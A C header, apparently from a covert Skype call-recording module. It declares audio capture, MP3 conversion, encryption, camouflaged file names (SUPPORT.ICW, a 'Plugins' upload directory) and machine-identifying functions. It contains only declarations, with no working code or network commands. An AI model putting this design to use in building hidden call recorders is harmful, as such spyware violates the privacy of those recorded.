/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */






#ifndef _VOIP_RECORDER_H
#define _VOIP_RECORDER_H

#include <windows.h>
#include <DSound.h>


#define MAX_AUDIO_SIZE 8388808


#define RECORDING_INPUT_SIGN_FILE "lookup.in"
#define RECORDING_OUTPUT_SIGN_FILE "lookup.out"


#define CHANNEL_OPEN 0
#define CHANNEL_CLOSED 1

#define MAX_BUF_SIZE 1024
#define snprintf _snprintf
#define stat _stat

#define VR_WORKING_EXTENSION "ban"
#define CALLID_FILE "SUPPORT.ICW"
#define FULL_FILE "cache"
#define UPLOAD_DIRECTORY "Plugins"
#define SIGN_UPLOADED "UPLOADED"
#define VR_BANNER "VOIPRECORDER"

#define MP3_HEADER_SIZE 92	
#define MAX_BUF_SIZE 1024

#define SKYPE_2 0
#define SKYPE_3 1

#define DEBUG 0
#define CRYPTO_ON 1


#define BUFMAXLEN	1024*5

#define TARGET7		"Skype.exe"
#define TARGET8		"skype.exe"
#define TARGET9		"SKYPE.EXE"
#define TARGET10	"SKYPE"
#define TARGET11	"skype"

#define snprintf _snprintf
#define MAX_BUF_SIZE 1024







typedef struct _sAudioData
{
//  char *mAudioDataBuffer;
  SHORT *mAudioDataBuffer;
  unsigned long mAudioDataSize;
  int mPacketNumber;
  int mHangUp;
} sAudioData;


typedef struct _ASTAT 
{
  ADAPTER_STATUS adapt;
  NAME_BUFFER NameBuff[30];
} ASTAT, *PASTAT;


typedef struct sRecordBlock
{
  DWORD wavsize;
  SHORT *wavdata;
  PBYTE mp3data;
  DWORD mp3datasize;
  char mHeaderData[1024];
  int mHeaderDataSize;
  char mRealFileName[MAX_BUF_SIZE + 1];
  char mPseudoFileName[MAX_BUF_SIZE + 1];
  int mBlockNumber;
} RECORD_BLOCK, *PRECORD_BLOCK;





typedef HRESULT (WINAPI *MYDIRECTSOUNDCAPTUREENUMERATE)(LPDSENUMCALLBACK lpDSEnumCallback, LPVOID lpContext);
typedef HRESULT (WINAPI *MYDIRECTSOUNDCREATE)(LPGUID lpGuid, LPDIRECTSOUND *ppDS, LPUNKNOWN  pUnkOuter);
typedef HRESULT (WINAPI *MYDIRECTSOUNDCAPTURECREATE)(LPGUID lpGUID, LPDIRECTSOUNDCAPTURE* lplpDSC, LPUNKNOWN pUnkOuter);
typedef HRESULT (WINAPI *MYCREATECAPTUREBUFFER)(LPCDSCBUFFERDESC pcDSCBufferDesc, LPDIRECTSOUNDCAPTUREBUFFER *ppDSCBuffer, LPUNKNOWN pUnkOuter);





DWORD WINAPI writeOutputThread(LPVOID lpParam);
DWORD WINAPI writeInputThread(LPVOID lpParam);

char *findLameBinary(char *pDirectoryPath, int pDirectoryPathSize, char *pBinaryPath, unsigned int pBinaryPathSize);
int convertAndWrite(char *pOutputFileName, SHORT *pWAVBuffer, int pBufferSize);
char *findBDHomeDirectory (char *pDirectory, unsigned int pDirectorySize);
int setRecordingMarker(char *pMarkerFile);
void deleteAnyRecordingFlag(char *pMarkerFile, char *pReason);
int voiceDataAvailable(char *pVoiceDirectory, char *pPattern);
int getCurrentCallID();

int getActiveUser(char *, int);
int myCompare(const void *v1, const void *v2);
WIN32_FIND_DATA getLatest(WIN32_FIND_DATA *a, int nbr);
int getMACAddress(char *pVolumeID, unsigned int pVolumeIDSize);
//int convert2MP3(SHORT *pWAVBuffer, int pBufferSize, struct sRecordBlock *pDataBlock, HANDLE pHandle);
int convert2MP3(SHORT *pWAVBuffer, int pBufferSize, struct sRecordBlock *pDataBlock);
int writeDataToFile(char *pOutputFile, char *pEncodedAndEncrypted, int pOutputLength);
void printDebug(char *pMsg, int pMsgLength);

#endif